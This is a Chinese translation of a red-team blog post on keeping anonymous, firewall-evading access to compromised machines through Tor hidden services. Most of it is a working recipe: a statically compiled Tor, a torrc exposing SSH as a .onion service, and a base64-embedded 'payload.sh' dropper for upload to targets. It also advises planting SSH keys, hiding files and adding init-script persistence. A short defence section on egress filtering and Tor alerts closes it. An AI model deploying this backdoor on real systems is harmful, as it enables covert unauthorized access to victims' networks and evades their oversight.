# 使用Tor绕过防火墙进行远程匿名访问

from:[Hack Like the Bad Guys – Using Tor for Firewall Evasion and Anonymous Remote Access](http://foxglovesecurity.com/2015/11/02/hack-like-the-bad-guys-using-tor-for-firewall-evasion-and-anonymous-remote-access/)

0x00 摘要
=======

* * *

在这篇文章中，我将使用一个工具和一组Red Team的技术进行保持匿名性访问受感染的机器。同时，我会提供一些检测后门和应对这类攻击的建议。

这并不是一个全新的理念，但据我所知这些技术还没从渗透测试和Red Team的角度进行深入谈论。[至少从2012年开始就有恶意软件的作者使用这些技术](https://community.rapid7.com/community/infosec/blog/2012/12/06/skynet-a-tor-powered-botnet-straight-from-reddit)。如果他们这么做，我们当然也不能落后。

0x01 动机
=======

* * *

那些使用成熟的安全项目的高端用户，每天都在监视着受害主机。当你使用IP地址远程访问时发现被阻止了，如果你还不赶紧退回去。那么攻击者的心情要是坏透了，他可能会试图找出IP地址的拥有者。到时候追究到你的团队就尴尬了。

一个简单可靠的解决方案是使用Tor。Tor网络可以用来访问受感染主机。那么Tor提供了哪些功能呢？

*   匿名服务。
*   不断变换IP地址让流量不会被阻塞在网络层。
*   模糊协议，使用Tor桥和Pluggable Transport进行绕过协议检测。
*   代理支持。
*   安全的Shell，使得客户不必承受不必要的风险。
*   能够使用受害的机器作为支点访问其它内部网络的主机。

0x02 安装配置Tor
============

* * *

实际上安装配置起来意外地简单！

但在开始之前，先回顾一下那些比较陌生的Tor概念。

TOR 101 网桥和目录（BRIDGES AND DIRECTORY）
------------------------------------

让我们从下图开始：

![](http://drops.javaweb.org/uploads/images/30ebe62724d9e237ce9febc747f4cc909a8e2994.jpg)

假设Alice想通过企业网络跟生病的奶奶在facebook上聊天。但不幸的是，企业的老板太没有同情心了。不允许员工在企业网络访问facebook。作为一个孝顺的孙女，Alice带来了一个存放了Tor客户端的U盘。

Alice的Tor客户端第一件事需要获取Tor中继列表，让它可以在网络上其它计算机上的运行的Tor客户端接受和中继加密流量。默认情况下，这是通过连接到1到9个“目录服务器（Directory Servers）”来实现。

为了绕过其他人的眼球，Alice使用了Tor“网桥（Bridge）”。网桥第一个作用就是作为Alice和Tor网络之间的支持物。网桥还可以通过“Pluggable Transport”支持的模糊协议掩盖流量让它不容易留下指纹。此外，网桥没有提供公开的列表。它们只能在同一时间获取几个。

TOR 102 隐藏服务和接入互联网
------------------

现在Alice可以跟一些Tor中继交流，假设她现在想访问Bob的web服务。下面的图片显示了Alice的访问过程：

![](http://drops.javaweb.org/uploads/images/4e7d0bb03314181e726217dc184b5c7bf2114572.jpg)

Tor另一个重要的功能是”隐藏服务“。类似于SSH隧道，隐藏服务接受本地TCP端口传入到Tor网络的流量中继到另一个Tor配置文件指定端口的主机。这挺有趣的，因为Tor网络监听端口传入连接可以绕过正规的网络防火墙。

任何连到Tor的隐藏服务都可以寻址”.onion“地址。每个隐藏服务豆油一个随机的RSA私钥用于加密所有通信内容。对应的公钥部分hash被用于”.onion“地址。所以它们通常看起来类似：”ab88t3k7eqe66noe.onion“。

所有Tor客户端到Tor隐藏服务的流量都是端对端加密。如何发起连接到隐藏服务和中继的详细机制可以在[这篇文章](https://www.torproject.org/docs/hidden-services.html.en)查看。需要注意重要一点的是，隐藏服务的名称会告知给Tor网络上少数节点。这是连接必要的条件。但这意味着隐藏服务不会被100%隐藏。

为什么会有这种事？
---------

因为Tor网络，特别是隐藏服务是所有攻击者的梦想。

考虑通过隐藏服务转发”2222“TCP端口到感染机器的SSH监听TCP端口”22“。

在这种情况下，我们可以通过以下方式来连接感染的机器：

```
ssh -i /path/to/key -p2222 someuser@ab88t3k7eqe66noe.onion

```

此连接在Tor网络上被匿名中继，绕过防火墙规则，甚至是代理和内存检查。

使用上面的SSH隧道，我们可以做各种事情：劫持，转发等等。

在Window机器上，445 SMB端口和3389 RDP端口也可以通过Tor网络实现上面的效果。

0x03 放码过来！
==========

* * *

这样做的好处是，很少需要定制代码。Tor的开发团队已经把脏活都做好了。你所需要的就是安装好一个静态编译的二进制文件并设置对应的配置文件。更nice的做法是，把它们捆绑到一个shell脚本，然后上传到目标机器，运行，搞定！接下里我们介绍这些内容。

构建傻瓜式静态二进制文件
------------

一个静态编译的二进制文件包含了所有所需的函数库。这意味着一个静态编译的二进制文件即可以在Ubuntu x64运行，也可以在Red Hat x64机器上运行。

不幸的是，静态编译Tor在Linux上支持并不完美。至少在Debian系的系统上使用该编译选项似乎没办法工作。所以做好应对调试GCC输出报错信息的心理准备。

我们在Kali 2.0上先下载一个新的Tor源码包和编译所需的依赖开发包，然后解压。

```
wget https://www.torproject.org/dist/tor-0.2.6.10.tar.gz
tar xzvf tor-0.2.6.10.tar.gz
cd tor-0.2.6.10
apt-get install libssl-dev libevent-dev zlib1g-dev

```

接下来运行配置脚本，我们可以简单地键入以下命令来静态编译，但根据环境的不同，我和你的编译选项可能会有所不同：

```
./configure --enable-static-tor \
    --with-libevent-dir=/usr/lib/x86_64-linux-gnu/ \
    --with-openssl-dir=/usr/lib/x86_64-linux-gnu/ \
    --with-zlib-dir=/usr/lib/x86_64-linux-gnu/

```

尽管我上面安装了libssl-dev，但还是产生了所错：

```
checking for openssl directory... configure: WARNING: Could not find a linkable openssl. If you have it installed somewhere unusual, you can specify an explicit path using --with-openssl-dir
configure: WARNING: On Debian, you can install openssl using "apt-get install libssl-dev"
configure: error: Missing libraries; unable to proceed.

```

尝试一下不选用编译选项，重新输入下面两条命令进行编译：

```
./configure
make

```

现在用LDD命令看看用上面指令编译出来的Tor二进制文件需要哪些动态库文件：

```
cd src/or
ldd tor    

linux-vdso.so.1 (0x00007ffe02d00000)
libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fd6982c3000)
libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fd697fc2000)
libevent-2.0.so.5 => /usr/lib/x86_64-linux-gnu/libevent-2.0.so.5 (0x00007fd697d7a000)
libssl.so.1.0.0 => /usr/lib/x86_64-linux-gnu/libssl.so.1.0.0 (0x00007fd697b1a000)
libcrypto.so.1.0.0 => /usr/lib/x86_64-linux-gnu/libcrypto.so.1.0.0 (0x00007fd69771f000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fd697502000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fd6972fe000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd696f55000)
/lib64/ld-linux-x86-64.so.2 (0x00007fd6988b7000)

```

蛋疼，需要不少动态库。那么如何构建一个不需要使用动态链接库的二进制文件？在之前编译Tor二进制，运行”make“的时候也会编译所有的库，我们现在只需要手动构建一个静态二进制文件。那么，我不会太深入细节，但这里是“GCC”命令来做到这一点（注意，这应该是从SRC目录下运行）：

```
gcc -O2 -static -Wall -fno-strict-aliasing -L/usr/lib/x86_64-linux-gnu/  -o tor tor_main.o ./libtor.a ../common/libor.a ../common/libor-crypto.a ../common/libcurve25519_donna.a ../common/libor-event.a /usr/lib/x86_64-linux-gnu/libz.a -lm /usr/lib/x86_64-linux-gnu/libevent.a -lrt /usr/lib/x86_64-linux-gnu/libssl.a /usr/lib/x86_64-linux-gnu/libcrypto.a  -lpthread -ldl

```

这是会吐出一堆的警告，但都是可以相对安全地忽略（我还是比较喜欢看到编译错误啊）。

使用”-static“告诉gcc编译一个静态二进制文件。”-L“选项告诉GCC怎么去查找libssl，libz和libevent开发包。Debian系列的操作系统把它们安装在“/usr/lib/x86_64-linux-gnu/”。”-o“选项指定输出的文件名和所有需要链接在一起的”.a“后缀文件。

完成之后再运行”ldd“：

```
ldd tor
not a dynamic executable

```

OK，已经没有依赖动态链接库。

配置Tor
-----

Tor运行时需要指定一个配置文件，通常情况下配置文件的名字是”torrc“。下面是一个toorc配置样例，打开你喜欢的编译器然后粘贴下面的语句：

```
Bridge 176.182.30.145:443 DE54B6962AB7ECBB88E8BC58BEA94B6573267515
Bridge 37.59.47.27:8001 E0671CF9CB593F27CD389CD4DD819BF9448EA834
Bridge 192.36.27.122:55626 35E199EFB98CDC9D3D519EA4F765C021A216F589
UseBridges 1
SocksPort 9050
SocksListenAddress 127.0.0.1
HiddenServiceDir ./.hs/
HiddenServicePort 2222 127.0.0.1:22

```

网桥的配置信息可以从bridges.torproject.org获取。你应该根据自己的环境替换它们。注意，一些特定的TCP端口在你的环境上可能不够权限运行（或者被占用），你应该找另外一个端口替换掉。上诉的例子中，443 TCP端口通常是不够权限使用的。

接下来两行“HiddenService”配置Tor所需的隐藏服务。 执行我们的新的隐藏服务进行测试，只需运行以下命令：

```
./tor -f /path/to/torrc

```

运行后将创建一个新目录”.hs“，该目录下有一个”hostname“文件。如果你cat一下这个文件的话可以看到一个你可访问你的隐藏服务的”.onion“地址。

假设SSH服务的机器上运行，我们应该能够从另一台计算机通过Tor网络连接到它。

```
ssh -p2222 user@ab88t3k7eqe66noe.onion

```

执行上面的命令，需要你的机器能够连接到Tor网络并能路由TCP流量。一个更简单的方法是运行一个已经为你配置好的虚拟机，如Tails和Whonix。如果打算用虚拟机的话我推荐使用Whonix。这些都很容易设置，所以我们没办法获取更多细节内容。

创建自动化安装文件
---------

让我们用bash脚本创建一个很酷的安装文件。

先把Tor二进制文件和修改后的torrc文件复制到新目录：

```
mkdir ~/payload
cp tor torrc ~/payload
cd ~/payload

```

还有一个重要的组件要添加到安装文件当中。因为Tor的运行要求系统有一个准确的时间。一个方法是，从一些知名网站使用的HTTP头解决。当你发送一个HTTP请求到Web服务器时，一些Web服务器会在它的响应中添加上当前时间。我们可以把系统时间调整到这个时间（需要root权限）。这一切都可以通过下面的perl脚本搞定：

```
wget http://www.rkeene.org/devel/htp/mirror/archive/perl/htp-0.9.3.tar.gz
tar xzvf htp-0.9.3.tar.gz
cp htp-0.9.3/sbin/htpdate-light .

```

现在运行`sudo ./htpdate-light`跟Google HTTP服务器进行时间同步。

接着对文件进行压缩以减少安装文件的体积：

```
tar cvzf binaries.tar.gz tor htpdate-light

```

现在我们创建一个安装脚本。在”payload.sh“脚本上把tar文件的base64编码保存到”torbin“变量。

```
echo '#!/bin/sh' > payload.sh
echo -n 'torbin=' >> payload.sh
cat binaries.tar.gz | base64 -w 0 >> payload.sh

```

然后用你喜欢的编辑器打开payload.sh，把下面的指令追加进去：

```
echo $torbin | base64 -d > binaries.tar.gz
tar xzvf binaries.tar.gz
rm binaries.tar.gz
chmod +x tor
echo '
Bridge 176.182.30.145:443 DE54B6962AB7ECBB88E8BC58BEA94B6573267515
Bridge 37.59.47.27:8001 E0671CF9CB593F27CD389CD4DD819BF9448EA834
Bridge 192.36.27.122:55626 35E199EFB98CDC9D3D519EA4F765C021A216F589
UseBridges 1
SocksPort 9050
SocksListenAddress 127.0.0.1
HiddenServiceDir ./.hs/
HiddenServicePort 2222 127.0.0.1:22
' > ./torrc
perl ./htpdate-light google.com
./tor -f ./torrc

```

我不建议在当前目录运行”payload.sh“。因为它会覆盖你的其它二进制文件。如果想测试的话把它拷贝到/tmp/目录下运行。

```
bash payload.sh

```

payload.sh会启动Tor匿名服务并绑定到SSH监听端口。要使用ssh登录的时候，我们只需要./.hs/hostname的主机名。如果你不知道用户的密码的话，可能还需要添加一个ssh密钥到~/.ssh/authorized_keys。

开机启动
----

如果你想在开机启动的时候用root用户启动服务，最简单的方法是修改”/etc/init.d“的init脚本。最好是把二进制文件和配置文件复制到一些不显眼的地方。然后修改”init“脚本让Tor在开机时启动。

利用代理绕过协议检测
----------

希望上面一切顺利，你不需要看这部分，因为这部分给不了你什么帮助：）。Tor网桥可以通过”pluggable transports“设置混淆，使流量看起来跟之前不一样。也可以通过”torrc“文件配置通过代理服务器推送流量。在后续我们可以详细说明一下怎么配置这个。因为会使这篇文章变得很长。

0x04 防御
=======

* * *

不幸的是，这种类型的攻击很难在网络层上阻止。这就是为什么我们使用它。使用”pluggable transports“和Tor网桥，攻击者可以混淆流量让它看起来像是正常的HTTP或HTTPS，并直接通过你的公司代理服务器使用一些”torrc“文件的选项。所以一些人在编译Tor的时候提供一些特性防止检测和审查。

第一步是确保出口的TCP流量被适当的过滤。攻击者想找到允许给定端口通过防火墙出站的任何异常是微乎其微。所有出口流量都应该强制通过公司代理出去。

代理的数据包检查在攻击之下会停止。如果你在凌晨1点前享受滚被单的话，应该配置上检测Tor连接报警。Tor的连接是100%会有人想做一些你不想他们做的事情。